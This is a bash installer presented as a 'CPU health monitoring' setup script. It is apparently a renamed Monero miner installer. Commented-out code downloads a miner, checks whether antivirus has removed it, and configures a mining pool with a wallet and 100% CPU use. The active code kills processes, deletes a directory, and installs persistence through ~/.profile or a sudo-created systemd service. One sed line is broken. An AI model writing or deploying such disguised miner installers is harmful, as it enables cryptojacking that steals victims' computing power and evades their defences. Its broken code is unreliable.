#!/bin/bash

VERSION=1.0

# printing greetings

echo "CPU Health monitoring setup script v$VERSION."
echo "(please report issues to tronexia@gmail.com email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists"
  exit 1
fi

if ! which lscpu >/dev/null; then
  echo "ERROR: This script requires \"lscpu\" utility to work correctly"
  exit 1
fi

if ! which curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

# printing intentions

echo "I will download, setup and run in background Monero CPU health_track."

echo

# start doing stuff: preparing health_track

echo "[*] Removing previous cpu_track health_track (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop cpu_track.service
fi
killall -9 cpumonit

echo "[*] Removing $HOME/cpu_track directory"
rm -rf $HOME/cpu_track


echo "[*] create directory $HOME/cpu_track"
[ -d $HOME/cpu_track ] || mkdir $HOME/cpu_track
#if ! tar xvf $HOME/auto-cpu_track/cpumonit.tar.gz -C $HOME/cpu_track; then
#  echo "ERROR: Can't unpack /tmp/cpumonit.tar.gz to $HOME/cpu_track directory"
#  exit 1
#fi
#rm /tmp/cpumonit.tar.gz

#echo "[*] Checking if advanced version of $HOME/cpu_track/cpumonit works fine (and not removed by antivirus software)"
#sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/cpu_track/config.json
#$HOME/cpu_track/cpumonit --help >/dev/null
#if (test $? -ne 0); then
#  if [ -f $HOME/cpu_track/cpumonit ]; then
#    echo "WARNING: Advanced version of $HOME/cpu_track/cpumonit is not functional"
#  else 
#    echo "WARNING: Advanced version of $HOME/cpu_track/cpumonit was removed by antivirus (or some other problem)"
#  fi

#  echo "[*] Looking for the latest version of Monero health_track"
#  LATEST_XMRIG_RELEASE=`curl -s https://github.com/cpumonit/cpumonit/releases/latest  | grep -o '".*"' | sed 's/"//g'`
#  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

#  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/cpumonit.tar.gz"
#  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/cpumonit.tar.gz; then
#    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/cpumonit.tar.gz"
#    exit 1
#  fi

#  echo "[*] Unpacking /tmp/cpumonit.tar.gz to $HOME/cpu_track"
#  if ! tar xvf $HOME/auto-cpu_track/cpumonit.tar.gz -C $HOME/cpu_track --strip=1; then
#    echo "WARNING: Can't unpack /tmp/cpumonit.tar.gz to $HOME/cpu_track directory"
#  fi
 # rm /tmp/cpumonit.tar.gz

#  echo "[*] Checking if stock version of $HOME/cpu_track/cpumonit works fine (and not removed by antivirus software)"
#  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/cpu_track/config.json
#  $HOME/cpu_track/cpumonit --help >/dev/null
#  if (test $? -ne 0); then 
#    if [ -f $HOME/cpu_track/cpumonit ]; then
#      echo "ERROR: Stock version of $HOME/cpu_track/cpumonit is not functional too"
#    else 
#      echo "ERROR: Stock version of $HOME/cpu_track/cpumonit was removed by antivirus too"
#    fi
#    exit 1
#  fi
#fi

#echo "[*] Miner $HOME/cpu_track/cpumonit is OK"

#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
#if [ "$PASS" == "localhost" ]; then
#  PASS=`ip route get 1 | awk '{print $NF;exit}'`
#fi
#if [ -z $PASS ]; then
#  PASS=na
#fi
#if [ ! -z $EMAIL ]; then
#  PASS="$PASS:$EMAIL"
#fi

#sed -i 's/"donate-level": *"[^"]*",/"donate-level": 1,/' $HOME/cpu_track/config.json
#sed -i 's/"url": *"[^"]*",/"url": "pool.minexmr.com:443",/' $HOME/cpu_track/config.json
#sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/cpu_track/config.json
#sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/cpu_track/config.json
#sed -i 's/"tls": *"[^"]*",/"tls": 'true',/' $HOME/cpu_track/config.json
#sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/cpu_track/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/cpu_track/cpumonit.log'",#' 
#sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/cpu_track/config.json

cp $HOME/cpu-health-monit/amdtrack.sh $HOME/cpu_track/health_track.sh
#sed -i 's/"background": *false,/"background": true,/' $HOME/cpu_track/config_background.json

# preparing script

echo "[*] Creating $HOME/cpu_track/health_track.sh script"
#cat >$HOME/cpu_track/health_track.sh <<EOL
#!/bin/bash
#if ! pidof cpumonit >/dev/null; then
#  nice $HOME/cpu_track/cpumonit \$*
#else
#  echo "Monero health_track is already running in the background. Refusing to run another one."
#  echo "Run \"killall cpumonit\" or \"sudo killall cpumonit\" if you want to remove background health_track first."
#fi
#while true;
#do
#CPU_MHZ=`echo $lscpu | grep "^CPU MHz:" | cut -d':' -f2 | sed "s/^[ \t]*//"`
#CPU_MHZ=`echo "$LSCPU" | grep "^CPU MHz:" | cut -d':' -f2 | sed "s/^[ \t]*//"`
#CPU_MHZ=${CPU_MHZ%.*}
#t=`echo $sensors | grep 'Core 0:' | sed -r 's/^.*:        +(.*)  +[(].*$/\1/'`
#echo Temperature Tdie $t
#echo CPU speed $CPU_MHZ
#mosquitto_pub -h airmode.live -t xeon_temp -m "$t"
#mosquitto_pub -h airmode.live -t xeon_speed -m "$CPU_MHZ"
#sleep 5
#done
#EOL

chmod +x $HOME/cpu_track/health_track.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep cpu_track/health_track.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/cpu_track/health_track.sh script to $HOME/.profile"
    echo "$HOME/cpu_track/health_track.sh >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/cpu_track/health_track.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running health_track in the background (see logs in $HOME/cpu_track/cpumonit.log file)"
  /bin/bash $HOME/cpu_track/health_track.sh >/dev/null 2>&1
else


  if ! which systemctl >/dev/null; then

    echo "[*] Running health_track in the background (see logs in $HOME/cpu_track/cpumonit.log file)"
    /bin/bash $HOME/cpu_track/health_track.sh >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup health_track activation after reboot yourself if possible."

  else

    echo "[*] Creating cpu_track systemd service"
    cat >/tmp/cpu_track.service <<EOL
[Unit]
Description=Monero health_track service
[Service]
ExecStart=$HOME/cpu_track/health_track.sh
Nice=10
[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/cpu_track.service /etc/systemd/system/cpu_track.service
    echo "[*] Starting cpu_track systemd service"
    sudo killall cpumonit 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable cpu_track.service
    sudo systemctl start cpu_track.service
    echo "To see health_track service logs run \"sudo journalctl -u cpu_track -f\" command"
  fi
fi

echo "[*] Setup complete"